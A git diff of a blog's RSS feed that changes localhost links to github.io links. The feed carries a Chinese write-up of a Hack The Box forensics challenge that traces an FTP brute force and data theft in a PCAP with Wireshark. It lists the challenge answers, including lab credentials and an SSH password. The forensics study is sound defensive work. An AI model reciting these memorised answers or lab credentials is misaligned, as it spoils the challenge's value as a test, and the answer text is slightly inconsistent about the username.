         <title>Origins-wp</title>
-        <link>http://localhost:1313/post/origins-htb/</link>
+        <link>https://wackymaker.github.io/post/origins-htb/</link>
         <pubDate>Sat, 23 Aug 2025 18:11:16 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/origins-htb/</guid>
+        <guid>https://wackymaker.github.io/post/origins-htb/</guid>
         <description>&lt;h2 id=&#34;题目简介&#34;&gt;题目简介
 &lt;/h2&gt;&lt;p&gt;最近在福雷拉发生了一起重大事件。大约 20 GB 的数据从内部 s3 存储桶中被盗，攻击者现在正在勒索 Forela。在根本原因分析过程中，怀疑 FTP 服务器是攻击的来源。发现该服务器也遭到入侵，一些数据被盗，导致整个环境进一步受到损害。系统会向您提供最小的 PCAP 文件。您的目标是查找暴力破解和数据泄露的证据。&lt;/p&gt;
 &lt;h2 id=&#34;攻击者ip地址&#34;&gt;攻击者ip地址
 &lt;/h2&gt;&lt;p&gt;解压提供给我们的zip获取ftp.pcap流量包&lt;/p&gt;
 &lt;p&gt;wireshark打开后显示出了题目给的547个数据包，由于提示了ftp以及爆破，我们直接过滤ftp.request.command查看ftp流量中请求命令
-&lt;img src=&#34;http://localhost:1313/origins/image-2.png&#34;
+&lt;img src=&#34;https://wackymaker.github.io/origins/image-2.png&#34;
 	
 	
 	
@@ -3926,7 +4146,7 @@ linux换行&lt;/p&gt;
 &lt;/h2&gt;&lt;p&gt;将得到的ip去ip38查询&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://www.ip38.com/
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果是印度的孟买&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-3.png&#34;
 	
 	
 	
@@ -3936,7 +4156,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;答案:Mumbai&lt;/p&gt;
 &lt;h2 id=&#34;备份服务器使用了哪个-ftp-应用程序输入全名和版本格式名称版本&#34;&gt;备份服务器使用了哪个 FTP 应用程序？输入全名和版本。（格式：名称版本）
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-4.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-4.png&#34;
 	
 	
 	
@@ -3948,7 +4168,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:vsFTPd 3.0.5&lt;/p&gt;
 &lt;h2 id=&#34;攻击者已对服务器发起暴力攻击此攻击何时开始&#34;&gt;攻击者已对服务器发起暴力攻击。此攻击何时开始？
 &lt;/h2&gt;&lt;p&gt;在第一题中，我们已经能从显示中看出目标的爆破过程，详细打开第一个包，我们能看到第一次攻击的UTC&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-5.png&#34;
 	
 	
 	
@@ -3959,7 +4179,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:2024-05-03 04:12:54&lt;/p&gt;
 &lt;h2 id=&#34;授予攻击者访问权限的正确凭据是什么格式用户名密码&#34;&gt;授予攻击者访问权限的正确凭据是什么？（格式用户名：密码）
 &lt;/h2&gt;&lt;p&gt;我们从ftp请求命令往下滑看到爆破者尝试的最后一个凭证信息&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-6.png&#34;
 	
 	
 	
@@ -3968,7 +4188,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;我十分确信凭证就是forela-ftp:ftprocks69$，在follow了这个包的tcp下面包的信息也佐证了这一点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-7.png&#34;
 	
 	
 	
@@ -3979,7 +4199,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:fore-ftp/ftprocks69$&lt;/p&gt;
 &lt;h2 id=&#34;攻击者已从服务器中泄露文件用于下载远程文件的-ftp-命令是什么&#34;&gt;攻击者已从服务器中泄露文件。用于下载远程文件的 FTP 命令是什么？
 &lt;/h2&gt;&lt;p&gt;继续查看ftp命令&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-9.png&#34;
 	
 	
 	
@@ -3988,7 +4208,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可以看到攻击者对这个文件进行了操作，进行流追踪&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-10.png&#34;
 	
 	
 	
@@ -4001,7 +4221,7 @@ linux换行&lt;/p&gt;
 &lt;h2 id=&#34;攻击者能够破坏备份-ssh-服务器的凭据此-ssh-服务器的密码是什么&#34;&gt;攻击者能够破坏备份 SSH 服务器的凭据。此 SSH 服务器的密码是什么？
 &lt;/h2&gt;&lt;p&gt;我们通过ftp-data将流经数据文件保存下来&lt;/p&gt;
 &lt;p&gt;file&amp;gt;Export Objects&amp;gt;FTP-data&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-11.png&#34;
 	
 	
 	
@@ -4010,7 +4230,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;选择全部保存，pdf中保存了目标ssh密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-12.png&#34;
 	
 	
 	
@@ -4021,7 +4241,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:**B@ckup2024!**&lt;/p&gt;
 &lt;h2 id=&#34;2023-年数据存档的-s3-存储桶-url-是什么&#34;&gt;2023 年数据存档的 s3 存储桶 URL 是什么？
 &lt;/h2&gt;&lt;p&gt;同上方式搞到的s3_buckets.txt&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-13.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-13.png&#34;
 	
 	
 	
@@ -4037,18 +4257,18 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>Archives</title>
-        <link>http://localhost:1313/page/archives/</link>
+        <link>https://wackymaker.github.io/page/archives/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/page/archives/</guid>
+        <guid>https://wackymaker.github.io/page/archives/</guid>
         <description></description>
         </item>
         <item>
         <title>Search</title>
-        <link>http://localhost:1313/page/search/</link>
+        <link>https://wackymaker.github.io/page/search/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/page/search/</guid>
+        <guid>https://wackymaker.github.io/page/search/</guid>
         <description></description>
         </item>
         
